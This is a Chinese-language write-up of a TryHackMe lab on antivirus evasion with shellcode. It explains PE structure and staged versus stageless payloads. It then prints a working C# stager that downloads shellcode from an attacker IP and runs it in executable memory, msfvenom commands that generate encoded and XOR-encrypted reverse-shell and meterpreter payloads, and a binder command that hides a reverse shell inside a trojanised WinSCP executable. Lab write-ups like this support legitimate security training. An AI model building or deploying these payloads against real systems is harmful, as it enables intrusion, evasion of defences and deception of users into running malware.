# Anti-Virus Evasion: Shellcode

学习shellcode编码、打包、活页夹和加密器。

在这个房间里，我们将探讨如何构建和交付有效载荷，重点是避免被常见的AV引擎检测到。我们将研究作为攻击者可用的不同技术，并讨论每种技术的优缺点。

---

## PE结构

Windows 可执行文件格式，又名 PE（可移植可执行文件），是一种保存文件所需信息的数据结构。这是一种在磁盘上组织可执行文件代码的方法。Windows 操作系统组件（如 Windows 和 DOS 加载程序）可以将其加载到内存中，并根据在 PE 中找到的解析文件信息执行它。

通常，Windows 二进制文件（如 EXE、DLL 和目标代码文件）的默认文件结构具有相同的 PE 结构，并且在 Windows 操作系统中适用于（x86 和 x64）CPU 体系结构。

PE 结构包含保存有关二进制文件的信息的各个部分，例如元数据和指向外部库内存地址的链接。其中一个部分是 PE 标头，其中包含元数据信息、指针和指向内存中地址部分的链接。另一部分是数据部分，其中包括包含Windows加载程序运行程序所需信息的容器，例如可执行代码，资源，库链接，数据变量等。

PE 结构中有不同类型的数据容器，每个容器保存不同的数据。

1) .text 存储程序的实际代码
2) .data 保存已初始化和定义的变量
3) .bss 保存未初始化的数据（未分配值的声明变量）
4) .rdata 包含只读数据
5) .edata：包含可导出的对象和相关表信息
6) .idata 导入的对象和相关表信息
7) .reloc 映像重新定位信息
8) .rsrc链接程序使用的外部资源，如图像，图标，嵌入式二进制文件和清单文件，其中包含有关程序版本，作者，公司和版权的所有信息！

在查看 PE 内容时，我们会看到它包含一堆人类不可读的字节。但是，它包括加载程序运行文件所需的所有详细信息。以下是 Windows 加载程序读取可执行二进制文件并将其作为进程运行的示例步骤。

1) 标头部分：解析 DOS、Windows 和可选标头以提供有关 EXE 文件的信息。例如
幻数以“MZ”开头，它告诉加载器这是一个 EXE 文件。
文件签名
文件是针对 x86 还是 x64 CPU 体系结构编译的。
创建时间戳。
2) 解析节表详细信息，例如
文件包含的节数。
3) 将文件内容映射到内存基址
EntryPoint 地址和 ImageBase 的偏移量。
RVA：相对虚拟地址，与图像库相关的地址。
4) 导入、DLL 和其他对象将加载到内存中。
5) 找到入口点地址并运行主执行函数。

## 分阶段paylaod

在绕过AV的目标中，我们将找到两种主要方法将最终shellcode传递给受害者。根据方法的不同，您会发现有效负载通常分为分阶段或无阶段有效负载。在此任务中，我们将研究两种方法的差异以及每种方法的优点。

### Stegless payloads

无阶段有效载荷将最终的shellcode直接嵌入到自身中。可以将其视为一个打包的应用程序，它以单步过程执行shellcode。

### Steged payloads

暂存有效负载通过使用中间外壳代码来工作，这些外壳代码充当导致执行最终外壳代码的步骤。这些中间外壳代码中的每一个都被称为暂存器，其主要目标是提供一种检索最终shellcode并最终执行它的方法。

分阶段一般分为两个阶段。第一阶段payload并不是直接与C2通信，因为第一阶段payload并没有shellcode，因此它可能不会被AV检测到，第一阶段会先从攻击者指定的位置，通过网络下载shellcode，然后将shellcode载入内存；第二阶段就是执行shellcode，最终连接到C2

### 优缺点

**在决定使用哪种类型的payload时，我们必须了解我们将要攻击的环境。每种有效payload类型都有优点和缺点，具体取决于特定的攻击场景。**

在无阶段有效载荷的情况下，您会发现以下优点：

- 生成的可执行文件包含使我们的shellcode工作所需的所有内容。
- 有效负载将在不需要其他网络连接的情况下执行。网络交互越少，您被 IPS 检测到的机会就越小。
- 如果要攻击网络连接非常有限的主机，则可能希望整个有效负载位于单个包中。

对于分阶段有效负载，您将拥有：

- 磁盘占用空间小。由于 stage0 只负责下载最终的外壳代码，因此它很可能很小。
- 最终的外壳代码不会嵌入到可执行文件中。如果您的有效负载被捕获，蓝队将只能访问 stage0 存根，仅此而已。
- 最终的shellcode加载到内存中，永远不会接触磁盘。这使得它不容易被AV解决方案检测到。
- 您可以对许多外壳代码重复使用相同的 stage0 滴管，因为您可以简单地替换提供给受害机器的最终外壳代码。

总之，我们不能说任何一种类型都比另一种更好，除非我们为其添加一些上下文。一般来说，无阶段有效载荷更适合具有大量外围安全性的网络，因为它不依赖于从互联网下载最终的shellcode。例如，如果您正在对封闭网络环境中的计算机执行 USB 丢弃攻击，而您知道您将无法将连接恢复到您的计算机，那么无阶段是可行的方法。

另一方面，当您希望将本地计算机上的占用空间减少到最低限度时，分阶段有效负载非常有用。由于它们在内存中执行最终有效负载，因此某些 AV 解决方案可能会发现更难检测到它们。它们也非常适合避免暴露您的外壳代码（通常需要相当长的时间来准备），因为外壳代码不会在任何时候（作为工件）放入受害者的磁盘中。

C# Steger:

```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "http://10.14.39.48:8000/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {
    WebClient wc = new WebClient();
    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

上两个房间的什么进程注入那些已经详细讲过了

生成shellcode

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.39.48 LPORT=8888 -f raw -o shellcode.bin -b '\x00\x0a\x0d'

## Shellcode 编码和加密

### 使用 MSFVenom 进行编码

Metasploit等公共工具提供编码和加密功能。但是，AV供应商了解这些工具构建其有效载荷的方式，并采取措施对其进行检测。如果您尝试使用开箱即用的此类功能，则一旦文件接触受害者的磁盘，您的有效负载就会被检测到。

	msfvenom --list encoders | grep excellent
	msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp

如果我们尝试将新生成的有效负载上传到我们的测试机器，AV 会在我们有机会执行它之前立即标记它：

![在这里插入图片描述](https://img-blog.csdnimg.cn/e774be088b3b4215a673e5405d0e7270.png)

### 使用 MSFVenom 进行加密

查看支持的加密类型

	msfvenom --list encrypt

生成xor加密的payload

	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe

再一次，如果我们将生成的外壳上传到THM防病毒检查！页，**它仍将被 AV 标记。原因仍然是AV供应商投入了大量时间来确保检测到简单的msfvenom有效载荷。**

C#的自定义编码/解码器我就不在这里记录了，也是非常的简单，thm也给出了示例

## Binders

虽然不是 AV bypass方法，但在设计要分发给最终用户的恶意负载时，粘合剂也很重要。绑定程序是将两个（或多个）可执行文件合并为一个可执行文件的程序。当您想要分发隐藏在另一个已知程序中的有效负载以欺骗用户相信他们正在执行不同的程序时，通常会使用它。

![在这里插入图片描述](https://img-blog.csdnimg.cn/6ea2a6a95e954bf6b60036b4b3c36532.png)

	msfvenom -a x64 --platform windows -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe

**binder的主要用途是欺骗用户，让他们相信他们正在执行合法的可执行文件而不是恶意负载。**

**在创建实际有效负载时，您可能希望使用编码器、加密器或打包程序来隐藏基于签名的 AV 的外壳代码，然后将其绑定到已知的可执行文件中，以便用户不知道正在执行什么。**